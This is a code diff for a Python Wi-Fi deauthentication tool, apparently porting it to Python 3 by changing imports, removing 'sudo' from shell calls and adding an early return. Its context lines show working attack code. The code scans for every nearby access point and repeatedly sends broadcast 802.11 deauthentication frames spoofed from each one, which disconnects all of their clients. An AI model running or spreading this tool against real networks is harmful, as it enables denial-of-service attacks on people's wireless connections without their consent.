@@ -6,10 +6,11 @@ import socket
 from subprocess import call
 from threading import Thread
 from time import sleep
-import printings
+import _thread
+from . import printings
 
 # local imports
-from scan import WifiScan
+from .scan import WifiScan
 
 conf.verb = 0
 
@@ -18,6 +19,7 @@ GREEN = "\033[1;32m"
 YELLOW = "\033[1;93m"
 T_YELLOW = "\033[0;93m"
 NORMAL = "\033[0;0m"
+
 
 class Deauth(object):
     def __init__(self, APs, interface):
@@ -37,16 +39,17 @@ class Deauth(object):
             for bssid in self.APs:
                 packet = Dot11(addr1=self.BROADCAST, addr2=bssid, addr3=bssid) / Dot11Deauth()
                 channel = self.APs[bssid]
-                call("sudo iwconfig {iface} channel {ch}".format(iface=self.interface, ch=channel), shell=True)
-                
+                call("iwconfig {iface} channel {ch}".format(iface=self.interface, ch=channel), shell=True)
+
                 try:
                     send(packet, count=self.burst)
                 except socket.error:
                     print("{R}ERROR: Network-Interface is down.{N}".format(R=RED, N=NORMAL))
                     sys.exit(0)
-                
+
                 print("[{G}+{N}] {pkt} frames sent to {Y}{bssid}{N}".format(pkt=self.burst, G=GREEN, N=NORMAL, Y=YELLOW, bssid=bssid.upper()))
                 sleep(1)
+
 
 class DeauthAll(object):
     def __init__(self, interface):
@@ -54,21 +57,23 @@ class DeauthAll(object):
         self.burst = 32
         self.BROADCAST = "FF:FF:FF:FF:FF:FF"
         self.deauth_active = False
+        self.APs = {}
 
     def start_deauth_all(self):
         def scan():
-            call("sudo clear", shell=True)
+            call("clear", shell=True)
             print("[{Y}*{N}] Scanning for new Access-Points... (8 sec.)".format(Y=YELLOW, N=NORMAL))
-            
+
             self.deauth_active = False
             wifiscan.channelhop_active = True
             wifiscan.do_scan()
             wifiscan.channelhop_active = False
             self.APs = wifiscan.get_access_points()
-            
+
             if len(self.APs) < 1:
                 print("\n{R}No Access-Points found. :({N}\n".format(R=RED, N=NORMAL))
-                thread.interrupt_main()
+                _thread.interrupt_main()
+                return
 
             printings.deauth_all()
             for bssid in self.APs:
@@ -102,8 +107,3 @@ class DeauthAll(object):
                     packet = Dot11(addr1=self.BROADCAST, addr2=bssid, addr3=bssid) / Dot11Deauth()
                     send(packet, count=self.burst)
                 sleep(1)
-
-                    
-
-
-
